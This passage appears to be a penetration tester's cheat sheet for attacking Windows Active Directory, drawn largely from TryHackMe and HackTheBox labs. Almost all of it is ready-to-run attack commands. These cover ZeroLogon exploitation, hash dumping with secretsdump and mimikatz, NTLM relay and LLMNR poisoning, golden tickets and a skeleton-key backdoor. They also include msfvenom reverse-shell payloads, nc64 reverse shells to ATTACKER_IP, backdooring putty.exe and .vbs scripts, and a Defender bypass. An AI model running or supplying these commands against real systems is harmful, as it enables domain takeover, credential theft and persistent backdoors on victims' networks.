If you find an endpoint where you can connect back to an arbitrary ldap server
- run `nc -vlp 389`
- Host a Rogue LDAP Server
  1. `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
  2. `sudo dpkg-reconfigure -p low slapd`
  3. `nano olcSaslSecProps.ldif`
  4. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
  5. Verify it: `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`


#### ZeroLogon

- Explanation of ZeroLogon: https://tryhackme.com/room/zer0logon

STEP 1, CHOOSE ONE EXPLOIT
- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/ZeroLogon by risksense/set_empty_pw.py' DC01 172.16.134.100`
- `python3 '/home/kali/Documents/windows-attack/CVE/ZeroLogon/CVE-2020-1472 Zerologon from SecuraBV/zerologon_tester.py' DC01 192.168.174.187`

STEP 2
- `impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'FABRICORP.LOCAL/FUSE$@10.10.10.193'`
- `impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 MULTIMASTER\$@10.10.10.179`
  - change only `'FABRICORP.LOCAL/FUSE$@10.10.10.193'` >> `DOMAIN/MACHINE$@IP`
  - once secrets are dumped, select users with the following command
    - `awk -F: '{print $1}' hashes.txt | sort | uniq`

STEP 3
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- use also a pass the hash attack for administrator
  - `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568 Administrator@10.10.169.118`

STEP 4
- RESTORATION: https://github.com/dirkjanm/CVE-2020-1472#restore-steps


#### Responder SSRF

- Setup Responder to create a spoofed WPAD proxy server
  - `sudo responder -I tun0 -wv`
  
  
#### LAPS and PXE

- [Taking over Windows Workstations thanks to LAPS and PXE](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)
- [PowerPXE](https://github.com/wavestone-cdt/powerpxe)
- [TryHackMe task 6 Breaching AD](https://tryhackme.com/room/breachingad)
1. `tftp -i $IP GET "\Tmp\x64{39...28}.bcd" conf.bcd`
2. `Import-Module .\PowerPXE.ps1`
3. `$BCDFile = "conf.bcd"`
4. `Get-WimFile -bcdFile $BCDFile`
5. `tftp -i $IP GET "<PXE Boot Image Location>" pxeboot.wim`
6. `Get-FindCredentials -WimFile pxeboot.wim`


#### LLMNR Poisoning

- It is possible that when you run nmap, or simply have traffic, you may receive communications. Use responders to capture hashes
1. `sudo responder -I tun0 -rdwv`
2. Listen to the traffic
3. Get the hash
4. crack the hash
   - `hashcat -m 5600 user.hash /usr/share/wordlists/rockyou.txt -o cracked.txt -O`


#### SMB Relay

- Requirements for attack: SMB signing must be disabled on the target; Relayed user credentials must be admin on the machine.
  - Discovery: `nmap --script=smb2-security-mode.nse -p445 192.168.220.0/24`
1. Turn off SMB and HTTP from the file `/usr/share/responder/Responder.conf`
2. `sudo responder -I tun0 -rdwv`
3. `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`
   - add the flag `-i` to get an interactive smb shell; connect with netcat `nc 127.0.0.1 1100`
   - add the flag `-c` to run a command, like `whoami`
   - add the flag `-e` to execute something, like a payload generated with msfvenom
4. Capture SAM hashes


#### IPv6 DNS Attacks

1. `mitm6 -d domain.local`
2. `sudo impacket-ntlmrelayx -6 -t ldaps://192.168.57.140 -wh fakewpad.domain.local -l lootme`
   - `-t ldaps://DOMAIN-CONTROLLER-IP`; change only the ip in this command
3. see the results in the directory 'lootme' for ntlmrelayx
4. for mitm6, if an admin logs in, it might succed in creating a new user
- See also: [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)


#### MFP Hacking

- See: [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)


#### Dump hashes

- `impacket-secretsdump spookysec/backup:backup2517860@10.10.3.105`
- `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`
  - `SYSTEM` is also a file you have to get
    - `SYSTEM` or `system.hive`
- you can also run
  1. `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > hashes.txt`
  2. `cat hashes.txt | cut -d ':' -f 4 > pothashes.txt`
  3. `gedit pothashes.txt`


#### Microsoft password automation decrypt

1. `$pw = "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | ConvertTo-SecureString`
2. `$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)`
3. `$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)`
4. `echo $UnsecurePassword`


#### Full control / Write privileges over a template (ESC4)

1. `certipy-ad req -username jodie.summers -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.234.30 -debug`
2. `certipy-ad auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.234.30`


#### WriteDACL

- If you find that your user or the group wich your user is part of has this right, follow these steps
1. `net user john abc123$ /add /domain`
2. `net group "Exchange Windows Permissions" john /add`
3. `net localgroup "Remote Management Users" john /add`
4. `When using evil-winrm, run the command 'Bypass-4MSI' to evade defender`
5. `iex(new-object net.webclient).downloadString('http://10.10.14.30/PowerView.ps1')`
6. `$pass = convertto-securestring 'abc123$' -asplain -force`
7. `$cred = new-object system.management.automation.pscredential('htb\john', $pass)`
8. `Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync`
9. Proceed with DCSync using `john:abc123$`


#### Azure AD (AAD) Sync service

- See: 
  - https://blog.xpnsec.com/azuread-connect-for-redteam/
  - https://github.com/dirkjanm/adconnectdump
  - https://app.hackthebox.com/machines/223
1. Extract password with [azuread_decrypt_msol.ps1](https://gist.github.com/analyticsearch/7453d22d737e46657eb57c44d5cf4cbb)
2. If it doesn't work, retrieve `$key_id`, `$instance_id` and `$entropy` with the following command (see also [azuread_decrypt_msol_v2.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c))
   - `sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"`


#### Group Policy Preferences (GPP) AKA MS14-025

1. `smbclient \\\\10.10.10.100\\Replication`
2. `prompt off`
3. `recurse on`
4. `mget *`
   - focus on the files: `Groups.xml`, `Registry.pol`, `GPE.INI`, `GptTmpl.inf`
     - use the command `tree` to explore better the directory
- `gpp-decrypt edBSH0whZlTJt/QS93jjcJ89mjWa89gc8guK0hK0dcqh+ZGMeX0sQbCiheijtlFCuNH9pG8sDVYdYw/NglVmQ`
- read Registry.pol
  - `regpol Registry.pol`
  - `Parse-PolFile -Path Registry.pol`


#### Dump NTDS.dit

- No creds, access on DC: `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
  - `root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`
- Disk shadow, see: https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-diskshadow
- With credentials: `impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6`
- More: https://www.hackingarticles.in/credential-dumping-ntds-dit/



#### Exploiting Domain Trust

1. With mimikatz, recover the KRBTGT password hash
   - `privilege::debug`
   - `lsadump::dcsync /user:za\krbtgt`
2. With PowerShell, recover the SID of the child domain controller
   - `Get-ADComputer -Identity "THMDC"`
3. With PowerShell, recover the SID of the Enterprise Admins
   - `Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc`
4. With mimikatz, create forged TGT
   - `kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt`
5. Verify the golden ticket > after that you can use Rubeus.exe
   - `dir \\thmdc.za.tryhackme.loc\c$`
   

#### AddMember + ForceChangePassword

1. Add our AD account to the IT Support group
   - `Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"`
   - Verify the result with: `Get-ADGroupMember -Identity "IT Support"`
   - At this point you should have inherited 'ForceChangePassword' Permission Delegation
2. Identify the members of the group to select a target. Since the network is shared, it might be best to select one further down in the list
   - `Get-ADGroupMember -Identity "Tier 2 Admins"`  
3. `$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force`
   - `Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password`

- If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run 'gpupdate /force' and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
- See [Exploiting AD Task 2](https://tryhackme.com/room/exploitingad)


#### Automated Relays

- With BloodHound, find instances where a computer has the "AdminTo" relationship over another computer
  - `MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
- A requirement is SMB signing enabled, check it with the following command
  - `nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`
Abuse Print Spooler Service
- Determine if the Print Spooler service is running
  - `GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc`
- Set up NTLM relay
  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -debug`
  - `impacket-ntlmrelayx -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug`
- `SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

Keylogging

1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1`
2. `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"`

From the victim
1. `certutil.exe -urlcache -split -f http://IP/shell.ps1`

From Meterpreter
1. `ps | grep "explorer"`
2. `migrate PID`
3. `getuid`
4. `keyscan_start`
5. `keyscan_dump`


#### GenericAll

[GenericAll on user](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-user)
1. `. .\PowerView.ps1`
2. `Get-ObjectAcl -SamAccountName L.Livingstone | ? {$_.ActiveDirectoryRights -eq "GenericAll"}`
3. See GenericAll also in other ways and for groups

[GenericAll on group](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-on-group)
1. `Get-NetGroup "domain admins"`
2. `Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=resourced,DC=local"}`
3. `net group "domain admins" L.Livingstone /add /domain`

Scenario: you can't access a shell with found credentials
1. run `bloodhound.py`
2. if you've found a GenericAll to a group that can PSremote, run the following command from 'ldeep' https://github.com/franc-pentest/ldeep
   - `ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"`



#### Kerberos Delegation

Resourced Based Constrained Delegation attack
- Requirement: GenericAll on system
1. `impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.174.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
2. `python3 /home/kali/Documents/windows-attack/Scripts/rbcd-attack/rbcd.py -dc-ip 192.168.174.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone`
3. `impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.174.175`
4. `export KRB5CCNAME=./Administrator.ccache`
5. `sudo echo '192.168.174.175 resourcedc.resourced.local' >> /etc/hosts`
6. `impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.174.175`

Another way to do it
1. Enumerate available delegations
   - `Import-Module C:\Tools\PowerView.ps1`
   - `Get-NetUser -TrustedToAuth`
2. Get Administrator role, dump secrets to get passwords for target account
   - `token::elevate`
   - `lsadump::secrets`
3. Exit mimikatz > enter Kekeo
4. Generate a TGT to generate tickets for HTTP and WSMAN services
   - `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
5. Forge TGS requests for the account we want to impersonate (for HTTP and WSMAN)
   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc`
   - `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
6. Exit Kekeo > Open Mimikatz to import the TGS tickets
   - `privilege::debug`
   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
   - `kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`
7. Exit mimikatz, run `klist` to verify that everything went fine
8. `New-PSSession -ComputerName thmserver1.za.tryhackme.loc`
9. `Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`
10. `whoami`


#### Kerberos Backdoors / Kerberos Skeleton

1. `privilege::debug`
2. `misc::skeleton`
Accessing the forest
- the default password is 'mimikatz', some examples:
  - `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
  - `dir \\Desktop-1\c$ /user:Machine1 mimikatz`


#### Testing found credentials

- `crackmapexec smb 192.168.174.187 -u usernames.txt -p passwords.txt --continue-on-success`
  - test `impacket-psexec` on success
- `crackmapexec winrm 192.168.212.165 -u users.txt -p passwords.txt --continue-on-success`
  - test `evil-winrm` on success
- `crackmapexec smb 192.168.174.187 -u usernames.txt -H hashes.txt --continue-on-success`
  - test the found hashes
- `runas.exe /netonly /user:<domain>\<username> cmd.exe`
- `xfreerdp /u:bitbucket /p:littleredbucket /cert:ignore /v:10.10.187.9`
- Note for post exploitation: you might find an `.xml` like `username.xml`. To test it:
  1. `$Credential = Import-Clixml -Path ./username.xml`
  2. `$Credential.GetNetworkCredential().password`
  - The last commnad, try it even randomly before saving something in `$credential`, you never know


#### <ins>Lateral Movement Techniques and Pivoting</ins>

- See: https://tryhackme.com/room/lateralmovementandpivoting
- `psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`
- `winrs.exe -r:THMIIS.za.tryhackme.com cmd`

#### WMI and WinRM

1. Create a PSCredential object that stores session's username and password
   ```PowerShell
   $username = '<username>';
   $password = '<password>';
   $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
   ```
2. Create a Common Information Model
   ```PowerShell
   $options = New-CimSessionOption -Protocol DCOM
   $session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $options
   $command = 'calc';
   ```
3. Tie all together with `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`

Another lateral movement
- `winrs -r:<target> -u:<username> -p:<password>  "cmd /c hostname & whoami"`
- `winrs -r:<target> -u:<username> -p:<password>  "powershell -nop -w hidden -e <BASE64>"`

PowerShell remoting
```PowerShell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
```
- To interact with the session, run the command `Enter-PSSession <SESSION-ID>`

**Connecting to WMI From Powershell, another process**
- Create a PSCredential object
  ```PowerShell
  $username = 'Administrator';
  $password = 'Mypass123';
  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
  ```
- Enstablish a connection
  - `Enter-PSSession -Computername TARGET -Credential $credential`
  - `Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`
  - ```PowerShell
    $Opt = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
    $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
    ```
- Same process done with wmic.exe
  - `wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"`
  - `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`
- Create Services Remotely with WMI
  - `Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "THMService2";DisplayName = "THMService2";PathName = "net user munra2 Pass123 /add";ServiceType = [byte]::Parse("16");StartMode = "Manual" }`
  - `$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"`
  - `Invoke-CimMethod -InputObject $Service -MethodName StartService`
  - Stop and delete service
    ```PowerShell
    Invoke-CimMethod -InputObject $Service -MethodName StopService
    Invoke-CimMethod -InputObject $Service -MethodName Delete
    ```

**Creating Scheduled Tasks Remotely with WMI**
- ```PowerShell
  $Command = "cmd.exe"
  $Args = "/c net user munra22 aSdf1234 /add"
  $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
  Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
  Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
  Delete unscheduled task
  ```
- Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"

**Example with WMI**
1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.25 LPORT=4445 -f msi > myinstaller.msi`
2. `smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4445;exploit"`
4. ```PowerShell
   $username = 't1_corine.waters';
   $password = 'Korine.1994';
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
   ```
5. `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

#### Remotely Creating Services Using sc
```Powershell
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add"
start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

#### Creating Scheduled Tasks Remotely
```Powershell
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

#### Spawn process remotely
1. `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.25 LPORT=4444 -o myservice.exe`
2. `smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`
3. `msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.46.25; set LPORT 4444;exploit"`
4. `nc -lvp 4443`

From the new shell on the listener
5. `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.25 4443"`
6. `sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto`
7. `sc.exe \\thmiis.za.tryhackme.com start THMservice-3249`


#### Backdooring .vbs Scripts
- `CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

#### Backdooring .exe Files
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`

#### RDP hijacking
1. Run `cmd` as Administrator
2. `PsExec64.exe -s cmd.exe`
3. List server's sessions with '`query user`'
4. Use `tscon.exe` and specify the `session ID` we will be taking over, as well as our current `SESSIONNAME`
   - `tscon 3 /dest:rdp-tcp#6`
   
#### SSH Remote Port Forwarding
- Victim: `ssh attacker@10.50.46.25 -R 3389:3.3.3.3:3389 -N`
- Attacker: `xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword`

#### SSH Local Port Forwarding (to expose attacker's port 80)

Victim
1. `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
2. ```Powershell
   add firewall rule
   netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
   ```
   
#### Port Forwarding With socat
1. Open port `1234` and redirect to port `4321` on host `1.1.1.1`
   ```Powershell
   socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
   ```
2. `netsh advfirewall firewall add rule name="Open Port 1234" dir=in action=allow protocol=TCP localport=1234`
- To expose attacker's port `80`: `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
- Example
  ```Powershell
  socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
  xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
  ```

#### Dynamic Port Forwarding and SOCKS
- Victim: `ssh attacker@10.50.46.25 -R 9050 -N`
- Attacker: 
  1. ```
     [ProxyList]
     socks4  127.0.0.1 9050
	 ```
  2. `proxychains curl http://pxeboot.za.tryhackme.com`

#### Rejetto HFS
1. `ssh tunneluser@10.50.46.25 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N`
2. `windows/http/rejetto_hfs_exec`
- See: [Task 7 "Tunnelling Complex Exploits"](https://tryhackme.com/room/lateralmovementandpivoting)

#### PsExec
```PowerShell
./PsExec64.exe -i  \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```
Requirements
- The user that authenticates to the target machine needs to be part of the Administrators local group
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- File and Printer Sharing has to be turned on

#### Pass the Hash
```PowerShell
/usr/bin/impacket-wmiexec -hashes :<hash> <username>@<IP>
```

1. Extract hashes
   ```PowerShell
   lsadump::sam
   sekurlsa::msv
   ```
3. Perform the PtH
   ```PowerShell
   token::revert
   sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

Requirements
- An SMB connection through the firewall
- The `ADMIN$` share must be available
- The attacker must present valid credentials with local administrative permission

#### Pass the Key / Overpass the Hash

1. Run the Notepad with `Run as different user` to cache the credentials on the machine
2. Run mimikatz. Execute the commands `privilege::debug` and `sekurlsa::logonpasswords` to dump the password hash for the user just used
3. Now, in mimikatz, execute the command `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell` to run a PowerShell
4. Authenticate to a network share of the target `net use \\<target>`
5. Use `klist` to notice the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File System (CIFS)
6. Now you can run `.\PsExec.exe \\<target> cmd`

Process
1. `sekurlsa::ekeys` 
2. RC4 hash
   ```PowerShell
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   AES128 hash
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   AES256 hash
   sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
   ```
4. On the reverse shell
   ```PowerShell
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

#### Pass the Ticket

1. Run mimikatz. Execute `#privilege::debug`
2. `sekurlsa::tickets /export` export all the TGT/TGS from memory
3. Verify generated tickets with `PS:\> dir *.kirbi`. Search for an administrator ticket in the local directory
4. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
   - Example: `kerberos::ptt [0;193553]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
5. Inspect the injected ticket with `C:\> klist`
6. Access the restricted shared folder.
   - Example `dir \\192.168.179.128\admin$`

#### DCOM

1. `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))` remotely Instantiate the MMC Application object
2. `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")` execute a command on the remote DCOM object
3. `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")` reverse shell, run a listener with `nc -lnvp 443`


### <ins>Credentials Harvesting</ins>

#### Cedential Access

Clear-text files
- `C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Database files
- `cd C:\ProgramData\McAfee\Agent\DB > ma.db > sqlitebrowser ma.db`
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)

Memory
- Clear-text credentials
- Cached Passwords
- AD Tickets

Password managers
- example: `*.kdbx`

Enterprise Vaults

Active Directory
- Users' description
- Group Policy SYSVOL
- NTDS
- AD Attacks

Network Sniffing

Registry
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`


Years ago you could find clear-text password in the GPP, so give it a shot. If it’s a new enviorments it won’t probably work tho.


#### Windows Credentials

- Keystrokes (keyscan_start / keyscan_stop)
- `copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\`
- `meterpreter > hashdump`

Shadow Copy Service
1. `wmic shadowcopy call create Volume='C:\'`
2. `vssadmin list shadows`
3. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam`
4. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system`

Registry Hives
1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`
2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`

Now, you can decrypt
- copy the files with `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
- `impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL`


#### Dump LSASS

GUI
1. Open Task Manager
2. Search for `lsass.exe` > right click "Create dump file"
3. `copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP`

Mimikatz
1. `privilege::debug`
2. `sekurlsa::logonpasswords`

Protected LSASS
1. `privielege::debug`
2. `!+`
3. `!processprotect /process:lsass.exe /remove`
4. `sekurlsa::logonpasswords`
   
   
#### Accessing Credential Manager

1. `vaultcmd /list`
2. `VaultCmd /listproperties:"Web Credentials"`
3. `VaultCmd /listcreds:"Web Credentials"`

RunAs
1. `cmdkey /list`
2. If it's not empty
   - `runas /savecred /user:THM.red\thm-local cmd.exe`
   
Mimikatz
1. `privilege::debug`
2. `sekurlsa::credman`


#### Domain Controller

1. `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
2. `impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local`
3. `impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@10.10.153.149`
   - `impacket-secretsdump -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.153.149`
4. `hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`


#### Local Administrator Password Solution (LAPS)

1. Verify if there is LAPS in the machine
   - `dir "C:\Program Files\LAPS\CSE"`
2. `Get-Command *AdmPwd*`
3. Find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS
   - `Find-AdmPwdExtendedRights -Identity THMorg`
   - `Find-AdmPwdExtendedRights -Identity *`
4. Cheeck the group and its members
   - `net groups "TARGET GROUP"`
   - `net user test-admin`
5. Compromise one of those accounts, get the password
   - `runas.exe /netonly /user:bk-admin cmd.exe`
   - `Get-AdmPwdPassword -ComputerName creds-harvestin`
   
